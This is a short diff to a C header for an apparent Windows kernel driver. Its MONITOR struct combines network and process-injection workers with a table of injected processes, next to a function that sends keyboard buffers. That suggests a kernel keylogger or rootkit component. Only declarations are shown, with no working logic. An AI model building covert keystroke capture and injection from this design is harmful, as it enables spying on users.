@@ -7,14 +7,16 @@
 #include <inc/keybrd.h>
 #include <inc/inject.h>
 #include <inc/thash.h>
+#include <h/drvioctl.h>
 
 #define MONITOR_STATE_STOPPED 1
 #define MONITOR_STATE_STARTED 2
 
 typedef struct _MONITOR {
 	SYSWORKER		NetWorker;
-	PMWSK_CONTEXT   WskContext;
 	SYSWORKER		InjectWorker;
+	SYSWORKER		RequestWorker;
+	PMWSK_CONTEXT   WskContext;
 	volatile LONG	State;
 	KGUARDED_MUTEX	Mutex;
 	THASH			InjectedProcTable;
@@ -28,6 +30,12 @@ NTSTATUS
 
 NTSTATUS
     MonitorStop();
+
+NTSTATUS
+	MonitorOpenWinsta(POPEN_WINSTA Winsta);
+
+NTSTATUS
+	MonitorOpenDesktop(POPEN_DESKTOP openDesktop);
 
 VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry);
 
